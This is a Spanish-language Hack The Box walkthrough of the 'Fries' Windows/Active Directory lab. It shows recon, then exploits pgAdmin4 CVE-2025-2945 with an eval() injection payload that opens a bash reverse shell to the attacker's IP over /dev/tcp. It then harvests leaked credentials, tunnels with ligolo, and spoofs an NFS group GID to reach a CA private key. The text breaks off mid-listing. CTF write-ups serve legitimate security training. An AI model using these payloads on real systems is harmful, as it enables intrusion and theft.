---
title: Fries - Hard (HTB)
permalink: /Fries-HTB-Writeup/
tags:
  - Windows
  - Hard
  - pgAdmin
  - CVE-2025-2945
  - NFS
  - PWM
  - "ACL Rights"
  - ESC7
  - ESC6
  - ESC16
  - "AD CS"
  - "SSH Local Port Forwarding"
  - "Credentials Leakage"
  - "UID/GID Spoofing"
  - Docker
  - TLS
  - ReadGMSAPassword
  - PassTheHash
  - BloodHound
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Fries - Hard (HTB)
seo_description: Explota CVE-2025-2945 en pgAdmin 4, abusa del un servidor NFS, PWM, derechos ACL y explota ESC7, ESC6 y ESC16 en AD CS para vencer Fries.
excerpt: Explota CVE-2025-2945 en pgAdmin 4, abusa del un servidor NFS, PWM, derechos ACL y explota ESC7, ESC6 y ESC16 en AD CS para vencer Fries.
header:
  overlay_image: /assets/images/headers/fries-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/fries-hackthebox.jpg
---
![image-center](/assets/images/posts/fries-hackthebox.png)
{: .align-center}

**Habilidades:** Subdomain Fuzzing, Information Leakage, CVE-2025-2945 - `pgAdmin4` Authenticated Remote Code Execution, Credentials Leakage, Linux System Enumeration, NFS Enumeration, Tunneling with `ligolo`, UID/GID Spoofing Attack (NFS), Abusing Docker over TLS - `X.509` Certificate Issuing, SSH Local Port Forwarding, Stealing LDAP Credentials - PWM Config File Manipulation, Domain Enumeration - `Bloodhound`, Abusing AD ACL Rights - `ReadGMSAPassword`, Abusing AD CS - From `ESC7` to `ESC6` + `ESC16` Technique with `Certify.exe` [Privilege Escalation], PassTheHash
{: .notice--primary}

# Introducción

Fries es una máquina Windows de dificultad `Hard` en HackTheBox en la que debemos comprometer un dominio de Active Directory a través de la explotación de una red de contenedores Linux, los cuales implementan los servicios `Gitea`, `pgAdmin4` y `PWM`. El acceso inicial lo obtendremos explotando una vulnerabilidad en `pgADmin4` (CVE-2025-2945). 

Lograremos nuestras primeras credenciales a nivel de dominio a través del robo de credenciales `LDAP` al subir un archivo de configuración malicioso al servicio `PWM`, para luego movernos lateralmente y finalmente escalar privilegios combinando tres técnicas que involucran permisos administrativos sobre el servicio AD CS (`ESC7`, `ESC6` y `ESC16`).

> Please allow up to 7 minutes for services to load. As is common in real life Windows penetration tests, you will start the Fries box with credentials for the following account : `d.cooper@fries.htb` / `D4LE11maan!!`
{: .notice--info}
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c1 10.10.11.96 
PING 10.10.11.96 (10.10.11.96): 56 data bytes
64 bytes from 10.10.11.96: icmp_seq=0 ttl=127 time=362.949 ms

--- 10.10.11.96 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 362.949/362.949/362.949/0.000 ms
~~~


## Port Scanning 

Lanzaremos un escaneo que identifique puertos abiertos en la máquina víctima. Primeramente utilizaremos el protocolo TCP e IPv4

~~~ bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.96 -oG openPorts

Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-22 23:09 -03
Nmap scan report for 10.10.11.96
Host is up (0.20s latency).
Not shown: 65510 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49685/tcp open  unknown
49686/tcp open  unknown
49688/tcp open  unknown
49689/tcp open  unknown
49913/tcp open  unknown
62142/tcp open  unknown
62169/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 81.62 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Lanzaremos un segundo escaneo con el propósito de identificar la versión y los servicios que se ejecutan en los puertos descubiertos

~~~ bash
nmap -p 22,53,80,88,135,139,389,443,445,464,593,636,2179,3268,3269,5985,9389,49667,49685,49686,49688,49689,49913,62142,62169 -sVC 10.10.11.96 -oN services
 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-22 23:11 -03
Nmap scan report for 10.10.11.96
Host is up (0.21s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://fries.htb/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-23 02:11:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
|_ssl-date: 2025-11-23T02:13:11+00:00; -16s from scanner time.
443/tcp   open  ssl/http      nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=pwm.fries.htb/organizationName=Fries Foods LTD/stateOrProvinceName=Madrid/countryName=SP
| Not valid before: 2025-06-01T22:06:09
|_Not valid after:  2026-06-01T22:06:09
|_http-title: Site doesn\'t have a title (text/html;charset=ISO-8859-1).
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-23T02:13:11+00:00; -13s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-23T02:13:12+00:00; -12s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
3269/tcp  open  ssl/ldap
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
|_ssl-date: 2025-11-23T02:13:11+00:00; -13s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49913/tcp open  msrpc         Microsoft Windows RPC
62142/tcp open  msrpc         Microsoft Windows RPC
62169/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -13s, deviation: 1s, median: -13s
| smb2-time: 
|   date: 2025-11-23T02:12:32
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.98 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Vemos una gran cantidad de servicios propios de Active Directory, como `DNS`, Kerberos, `RPC`, `LDAP`, etc. Por lo que podemos asumir que la máquina víctima es un Controlador de Dominio. 

Dentro de la información de la captura, podemos ver tanto el nombre del DC como del dominio, vemos un sub-dominio en el certificado SSL para el puerto `443` (`https`).

Agregaremos toda esta información a nuestro archivo `/etc/hosts` para poder aplicar correctamente las resoluciones DNS correspondientes

``` bash
echo '10.10.11.96 fries.htb DC01.fries.htb pwm.fries.htb' | sudo tee -a /etc/hosts

10.10.11.96 fries.htb DC01.fries.htb pwm.fries.htb
```


## Web Enumeration

En mi caso comencé por enumerar el servicio `http`, donde primeramente podemos lanzar un escaneo de las tecnologías web que ejecuta el servidor.

``` bash
whatweb http://fries.htb

http://fries.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@fries.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.96], Script, Title[Welcome to Fries - Fries Restaurant], nginx[1.18.0]
```

Al visitar el dominio `fries.htb`, se cargará la siguiente web, la cual parece ser una página de un restaurante

![image-center](/assets/images/posts/fries-1-hackthebox.png)
{: .align-center}


## Subdomain Fuzzing

Lanzaremos un escaneo para intentar identificar subdominios existentes para este servidor web, en este caso usaré `gobuster`, aunque puedes usar cualquier herramienta de `fuzzing`

``` bash
gobuster vhost -u http://fries.htb -w /usr/local/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://fries.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/local/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: code.fries.htb Status: 200 [Size: 13593]
```

Encontramos el subdominio `code.fries.htb`, agregaremos esto a nuestro archivo `/etc/hosts`. De lo contrario, nuestro sistema no podrá aplicar una resolución DNS correctamente


## Gitea - `code.fries.htb`

Al visitar el nuevo subdominio, nos encontraremos con el servicio `gitea`.

> `Gitea` es una plataforma de alojamiento de código fuente autoalojada, ligera y de código abierto, similar a `GitHub` o `GitLab`, que permite a individuos y equipos gestionar sus repositorios `Git` de manera privada y eficiente.
{: .notice--info}

![image-center](/assets/images/posts/fries-2-hackthebox.png)
{: .align-center}

Iniciaremos sesión en Gitea con las credenciales proporcionadas

![image-center](/assets/images/posts/fries-3-hackthebox.png)
{: .align-center}

### `fries.htb` Repository

Una vez dentro, veremos que existe un repositorio del que `d.cooper` es propietario, el cual corresponde al código de la web del principio

![image-center](/assets/images/posts/fries-4-hackthebox.png)
{: .align-center}

### Information Leakage

Analizando dentro de los `commits`, veremos que el primero cargó credenciales de la base de datos

![image-center](/assets/images/posts/fries-5-hackthebox.png)
{: .align-center}

``` bash
DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
SECRET_KEY=y0st528wn1idjk3b9a
```

Además, en el archivo `README.md` del repositorio de la web podemos ver que se filtra el nombre de un usuario de la máquina host

![image-center](/assets/images/posts/fries-6-hackthebox.png)
{: .align-center}

También podemos ver un subdominio relacionado con el backend, donde según el `README`, deberíamos tener acceso

![image-center](/assets/images/posts/fries-7-hackthebox.png)
{: .align-center}

Agregaremos rápidamente `db-mgmt05.fries.htb` a nuestro archivo `/etc/hosts` para poder resolver correctamente este nombre de dominio

``` bash
sudo sed -i 's/fries.htb$/& db-mgmt05.fries.htb/g' /etc/hosts
```


## PWM - `pwm.fries.htb`

Al navegar hasta el sub-dominio `pwm.fries.htb` por `https://`, veremos el servicio `PWM`.

> PWM es una aplicación de autoservicio de contraseñas de código abierto y basada en web diseñada para directorios `LDAP`.

Como es un proyecto de código abierto, podemos encontrar el repositorio oficial en [Github](https://github.com/pwm-project/pwm).

El siguiente mensaje que aparece al inicio nos dice que esta herramienta se encuentra en modo de configuración

![image-center](/assets/images/posts/fries-8-hackthebox.png)
{: .align-center}

> Este modo permite actualizar la configuración sin necesidad de autenticarse primero en el directorio `LDAP`.
{: .notice--danger}

Cuando intentamos iniciar sesión con unas credenciales que no son válidas, vemos el siguiente mensaje

![image-center](/assets/images/posts/fries-9-hackthebox.png)
{: .align-center}

> Se hace alusión a que no se puede establecer la conexión con el servidor `LDAPS`, debido a un error de configuración en PWM.
{: .notice--warning}


## PgAdmin - `dbms_5.fries.htb`

Al navegar hasta `db-mgmt05.fries.htb`, veremos la interfaz web de la plataforma `pgAdmin` en su versión `4`.

> `pgAdmin` es la herramienta de código abierto más utilizada para gestionar bases de datos PostgreSQL. Está diseñada para simplificar todas las tareas relacionadas con la gestión de base datos (visualización de datos, generar diagramas, crear, actualizar, borrar tablas, etc.) mediante una interfaz gráfica intuitiva.
{: .notice--info}

![image-center](/assets/images/posts/fries-10-hackthebox.png)
{: .align-center}

Podremos iniciar sesión en la plataforma con las credenciales iniciales: `d.cooper@fries.htb:D4LE11maan!!`

![image-center](/assets/images/posts/fries-11-hackthebox.png)
{: .align-center}
<br>


# Intrusión / Explotación
---
## CVE-2025-2945 - `pgAdmin4` Authenticated Remote Code Execution

Podemos consultar la versión en la pestaña `Help` > `About pgAdmin 4` en la barra superior, donde se muestra la versión de `pgAdmin`

![image-center](/assets/images/posts/fries-12-hackthebox.png)
{: .align-center}

[CVE-2025-2945](https://nvd.nist.gov/vuln/detail/CVE-2025-2945) es una vulnerabilidad en la plataforma `pgAdmin4`, permitiendo la ejecución remota de comandos, afectando a las versiones `<= 9.1`

### Understanding Vulnerability

El fallo es producido a través de la falta de sanitización en el uso de la función `eval()` de Python para las entradas del usuario en dos componentes:

Los parámetros `query_commited` en el endpoint `/sqleditor/query_toor/download` y `high_availability` en el endpoint `/cloud/deploy` se pasan de forma insegura a la función `eval()` de Python, permitiendo ejecución de código arbitrario

``` http
POST /sqleditor/query_tool/download/5559751 HTTP 1.1
...
<SNIP>
...
Content-Type: application/json

{"query_commited": "__import__('os').system('id')"}
```

### Exploiting

Iniciaremos un listener que se encargue de recibir la conexión por un puerto, en mi caso elegí el `443`

``` bash
nc -lvnp 443
```

Podemos usar la siguiente [prueba de concepto](https://github.com/Cycloctane/cve-2025-2945-poc) que envía una solicitud POST al endpoint `/sqleditor/query_toor/download` posterior a la autenticación con el fin de inyectar código malicioso

``` bash
python3 exp.py --target-url http://db-mgmt05.fries.htb --username d.cooper@fries.htb --password 'D4LE11maan!!' --db-user root --db-pass 'PsqLR00tpaSS11' --db-name ps_db --payload "__import__('os').system('bash -c \"bash -i >& /dev/tcp/10.10.16.203/443 0>&1\"')"  
[+] pgAdmin4 version 9.1 is affected
[+] Successfully authenticated to pgAdmin
[+] Found valid server ID: 1
[+] Exploiting the target...
```

En este caso estamos enviando un comando que ejecuta una reverse shell directamente hacia nuestra IP

![image-center](/assets/images/posts/fries-13-hackthebox.png)
{: .align-center}


## Shell as `pgadmin` - `PgAdmin` Container

Nuestro listener recibirá la conexión desde un contenedor como el usuario `pgadmin`

``` bash
nc -lvnp 443
Connection from 10.10.11.96:49848
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
cb46692a4590:/pgadmin4$ 
cb46692a4590:/pgadmin4$ whoami
whoami
pgadmin
```

### TTY Treatment

Si intentamos lanzar una pseudo consola tradicional con el comando `script`, notaremos que no existe este comando en este contenedor

``` bash
cb46692a4590:/pgadmin4$ script /dev/null -c bash
script /dev/null -c bash
bash: script: command not found
```

Probaremos alternativas como lanzarla con `python` de la siguiente forma, continuando con el tratamiento clásico

``` bash
cb46692a4590:/pgadmin4$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
cb46692a4590:/pgadmin4$ ^Z # Press Ctrl+Z
[1]  + 17352 suspended  nc -lvnp 443
andrees@HackBookPro cve-2025-2945-poc $ stty raw -echo;fg
[1]  + 17352 continued  nc -lvnp 443
                                    reset xterm
cb46692a4590:/pgadmin4$ export TERM=xterm
cb46692a4590:/pgadmin4$ stty rows 42 columns 142
```


## Credentials Leakage

Si miramos las variables de entorno, encontraremos una contraseña supuestamente de `PGADMIN`

``` bash
cb46692a4590:/pgadmin4$ env

PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
CORRUPTED_DB_BACKUP_FILE=
PGAPPNAME=pgAdmin 4 - CONN:8740383
HOSTNAME=cb46692a4590
SERVER_SOFTWARE=gunicorn/22.0.0
PWD=/pgadmin4
CONFIG_DISTRO_FILE_PATH=/pgadmin4/config_distro.py
HOME=/home/pgadmin
OAUTHLIB_INSECURE_TRANSPORT=1
PYTHONPATH=/pgadmin4
SHLVL=3
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
```


## Shell as `svc` (SSH)

Esta contraseña nos permite conectarnos por `ssh` como el usuario `svc`

``` bash
ssh svc@fries.htb     

svc@fries.htb\'s password:
...
<SNIP>
... 
Last login: Sun Nov 23 23:31:16 2025 from 10.10.16.203
svc@web:~$   
svc@web:~$ export TERM=xterm # Limpiar la pantalla con Ctrl+L
```


## System Enumeration - `Linux`

Nos encontramos dentro de una máquina Linux conectados por `ssh`. Sin embargo, no estamos dentro del host, por lo que necesitamos buscar vectores potenciales que nos permitan acceder al host

### Network

Enumerando las interfaces de red, veremos que esta máquina se encuentra dentro de una subred `192.168.100.X/X`

``` bash
svc@web:/tmp/certs$ hostname -I
192.168.100.2 172.18.0.1 172.17.0.1
```

Al ver el archivo `hosts`, veremos que el DC se encuentra en esta subred

``` bash
svc@web:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.0.1 local fries.htb db-mgmt05.fries.htb code.fries.htb pwm.fries.htb

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
192.168.100.1 dc01.fries.htb dc01
```

### Users

Enumerando los usuarios del sistema, notaremos al usuario `barman` y a `postgresql`

``` bash
svc@web:/tmp/certs$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
svc:x:1000:1000:svc:/home/svc:/bin/bash
barman:x:117:120:Backup and Recovery Manager for PostgreSQL,,,:/var/lib/barman:/bin/bash
```


## NFS Enumeration

> NFS (`Network File System`) es un protocolo que permite compartir archivos en una red, haciendo que un usuario acceda y manipule archivos en un servidor remoto como si estuvieran en su propia computadora local.
{: .notice--info}

### Understanding NFS

Un servidor NFS funciona con el protocolo RPC, no se trata de un puerto específico. Esto le permite montar un sistema de archivos remoto como si fuera local, este servicio generalmente hace uso de los siguiente puertos:

- Puerto `111` (TCP/UDP), ayuda a encontrar los puertos dinámicos de otros servicios NFS, más conocido como `portmapper`.
- Puerto `2049` (TCP/UDP), maneja el tráfico principal de datos NFS, donde se accede a los sistemas de archivos remotos.
- Puertos **dinámicos**: Servicios como `mountd`, `statd`, y `nlockmgr` (necesarios en NFSv3) utilizan puertos asignados aleatoriamente al iniciar.

> El `portmapper` de puertos mantiene una lista de los servicios que se ejecutan en cada puerto. 
> 
> Esta lista es utilizada por una máquina conectada para ver con qué puertos quiere comunicarse para acceder a determinados servicios.
{: .notice--info}

### Enumerating

Al listar los archivos de forma completa en el directorio actual (`/home/svc`), notaremos un enlace simbólico que apunta a `/srv/web.fries.htb/webroot/`

``` bash
svc@web:~$ ls -la
total 32
drwxr-x--- 5 svc  svc  4096 Nov 12 01:44 .
drwxr-xr-x 3 root root 4096 Jun  1 01:17 ..
lrwxrwxrwx 1 root root    9 Nov 12 01:44 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3866 May 26  2025 .bashrc
drwx------ 3 svc  svc  4096 May 26  2025 .cache
lrwxrwxrwx 1 svc  svc    27 May 28 17:18 fries.htb -> /srv/web.fries.htb/webroot/
drwxrwxr-x 3 svc  svc  4096 May 26  2025 .local
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
drwx------ 2 svc  svc  4096 Aug 20  2023 .ssh
```

Bajo la ruta `/srv/web.fries.htb` se encuentran algunos directorios, donde existe uno llamado `shared`, con permisos completos. Además vemos un directorio `certs` donde  el grupo `infra managers` posee acceso

``` bash
svc@web:~$ ls -la /srv/web.fries.htb/
total 20
drw-r-xr-x 5  655 root           4096 May 28 17:17 .
drwxr-xr-x 3 root root           4096 May 27  2025 ..
drwxrwx--- 2 root infra managers 4096 May 26  2025 certs
drwxrwxrwx 2 root root           4096 May 31 11:11 shared
drwxr----- 5 svc  svc            4096 Jun  7 13:30 webroot
```

Si buscamos este grupo dentro de `/etc/group`, no aparece. Esto de debe a que este grupo no existe a nivel local, sino que proviene de una fuente externa (como en este caso podría ser el directorio LDAP configurado en el DC).

El comando `showmount` mostrará el recurso compartido `nfs`, en este caso con `-e` mostramos los directorios que el servidor exporta y los clientes autorizados para conectarse a él

``` bash
svc@web:~$ showmount -e 127.0.0.1
Export list for 127.0.0.1:
/srv/web.fries.htb *
```


## Tunneling

Como no tenemos acceso desde nuestra máquina de forma directa al servidor NFS, necesitamos hacer que los puertos necesarios para este servicio sean accesibles desde fuera de la red interna

### `Ligolo`

 Para evitar complicaciones al intentar reenviar los puertos dinámicos, la mejor opción es utilizar una herramienta de tunneling como `ligolo`.

Para usar `ligolo`, la máquina víctima debe tener disponible el binario `agent`, necesario para conectarse a nuestro servidor

``` bash
python3 -m http.server 80 # Start an HTTP Server from your machine

# Download and grant perms to ligolo
svc@web:/tmp$ wget http://10.10.16.203/agent
svc@web:/tmp$ chmod +x agent
```

Desde nuestra máquina, ejecutaremos el binario `proxy` para establecer el servidor, este se pondrá a la escucha por el puerto `11601`

``` bash
sudo ./proxy -selfcert

INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.8.2

ligolo-ng »  
```

Nos conectaremos al servidor empleando la siguiente sintaxis

``` bash
svc@web:/tmp$ ./agent -connect 10.10.16.203:11601 -ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.16.203:11601"
```

Desde el servidor, veremos cómo se ha iniciado la conexión correctamente

``` bash
ligolo-ng » INFO[0046] Agent joined.                                 id=00155d0bcd01 name=svc@web remote="10.10.11.96:49836"
```

Cambiaremos a la sesión `1`, la cual obviamente es la que acabamos de iniciar

``` bash
ligolo-ng » session
? Specify a session : 1 - svc@web - 10.10.11.96:49836 - 00155d0bcd01
```

En mi caso estoy en MacOS, por lo que la interfaz que debo usar debe cumplir ciertos requisitos, te dejo una [guía de configuración](https://docs.ligolo.ng/Quickstart/#start-the-tunneling) del túnel para que puedas configurar según tu entorno

``` bash
[Agent : svc@web] » start --tun utun100
INFO[0450] Starting tunnel to svc@web (00155d0bcd01)
```

### Route

Ahora debemos configurar la interfaz y añadir la ruta de la red objetivo, como se explica en la [documentación](https://docs.ligolo.ng/Quickstart/#setup-routing)

``` bash
sudo ifconfig utun100 alias 10.0.0.1 255.255.255.0
sudo route add -net 192.168.100.0/24 -interface utun100
```

Comprobaremos conectividad realizando una traza ICMP hacia la máquina Linux

``` bash
ping -c 1 192.168.100.2                  
PING 192.168.100.2 (192.168.100.2): 56 data bytes
64 bytes from 192.168.100.2: icmp_seq=0 ttl=64 time=827.004 ms

--- 192.168.100.2 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 827.004/827.004/827.004/0.000 ms
```

### Mount

Si ahora intentamos enumerar los directorios que exporta el servidor NFS, deberíamos tener alcance hacia el recurso `/srv/web.fries.htb` desde nuestra máquina

``` bash
showmount -e 192.168.100.2
Exports list on 192.168.100.2:
/srv/web.fries.htb                  *
```

Iniciaremos una montura del recurso NFS remoto en un directorio local de la siguiente manera

``` bash
mkdir /tmp/nfs
mount -t nfs 192.168.100.2:/srv/web.fries.htb /tmp/nfs
```

Ahora podremos listar los directorios de este recurso

``` bash
ls -la /tmp/nfs                                          
drw-r-xr-x 655  wheel    4.0 KB Wed May 28 13:17:59 2025 .
drwxrwxrwt root wheel    288 B  Thu Nov 27 00:07:11 2025 ..
drwxrwx--- root 59605603 4.0 KB Mon May 26 14:13:35 2025 certs
drwxrwxrwx root wheel    4.0 KB Sat May 31 07:11:02 2025 shared
drwxr----- 1000 1000     4.0 KB Sat Jun  7 09:30:56 2025 webroot
```


## UID/GID Spoofing Attack

Podemos aprovechar la configuración del servidor NFS que vimos anteriormente en el archivo `/etc/exports`, con el fin de suplantar al grupo `infra managers` para obtener acceso no autorizado en el directorio `certs`

### Understanding Misconfiguration

En las versiones anteriores a NFSv4, el servidor confía en la declaración que el cliente realiza sobre su `UID/GID` sin una verificación adicional. 

Esto permite a un atacante hacerse pasar por cualquier usuario dependiendo de la configuración del servidor NFS, esta condición se debe al concepto de [`User Squashing`](https://www.opswat.com/docs/mdss/3.4.3/knowledge-base/what-is-user-squashing-for-network-file-system-nfs).

> En NFS, el `squashing` de usuarios es un mecanismo de seguridad que controla cómo se asignan los ID de usuario (`UID/GID`) entre las máquinas cliente y servidor. 
{: .notice--info}

El `User Squashing` aparece configurado en el archivo `/etc/exports`, que declara la configuración de un servidor NFS:

> - `Root Squashing`: Configuración por defecto. Cuando un usuario con privilegios (el UID/GID `0`) intenta acceder al recurso NFS, su ID se asigna a un usuario específico (como `nobody`), previniendo la suplantación de `root`.
> 
> - `All Squashing`: Asigna todos los ID de usuario del cliente a un usuario específico (normalmente `nobody`), proporcionando permisos mínimos a todos los usuarios que se conectan al recurso NFS.
> 
> - `No Root Squashing`: Desactiva el `User Squashing`, permite a cualquier usuario del cliente conservar sus UID/GID originales durante la conexión, incluso `root`.
{: .notice--info}

### Verifying Configuration

Podemos consultar el archivo `/etc/exports` para verificar la configuración del `User Squashing` en este contexto

> El archivo `/etc/exports` es el archivo de configuración principal para servidores NFS, donde se definen qué directorios locales se comparten con sistemas remotos y qué permisos tienen, como acceso de solo lectura (`ro`) o lectura/escritura (`rw`), y qué usuarios o redes pueden acceder.
{: .notice--info}

``` bash
svc@web:/srv/web.fries.htb$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/srv/web.fries.htb *(rw,no_subtree_check,insecure)
```

- Cualquier cliente puede conectarse a este servidor NFS
- `rw` otorga permisos de lectura y escritura sobre este recurso
- `no_root_squash` no está presente, por lo que se usa la configuración `root_squash` (explicación más adelante).

Con esta configuración podemos intentar un ataque de suplantación de un usuario que no sea `root`. En este caso tenemos la posibilidad de suplantar al grupo `infra managers` para acceder al directorio `certs`.

### Exploiting

El `GID` del grupo `infra managers` corresponde al número `59605603`, podemos obtenerlo mediante el comando `getent`

``` bash
svc@web:~$ getent group 'infra managers' | cut -d: -f3
59605603
```

Para crear un usuario existe el comando `useradd`, pero requiere privilegios. Si intentamos crear un usuario de forma local, no tendremos éxito.

Aprovecharemos el servidor NFS para suplantar al grupo `infra managers` creando un usuario con el mismo `GID`

``` bash
sudo useradd -m -u 117 barman
sudo groupadd -g 59605603 'infra managers'
sudo usermod -aG barman 59605603
```

Cambiaremos el nuevo usuario, en este caso no es del todo necesario que sea `barman`

``` bash
su - barman
barman:attacker-machine:~$ id
uid=117(barman) gid=59605603 groups=59605603
```

Ya tendremos la capacidad para listar el directorio `certs` desde nuestra máquina

``` bash
barman:attacker-machine:~$ ls -la /tmp/nfs/certs 
total 33
drwxrwx---  2 root  59605603  4096 May 26  2025 .
drw-r-xr-x  5 655   wheel     4096 May 28  2025 ..
-rw-r-----  1 root  59605603  1708 Dec 22  2025 ca-key.pem
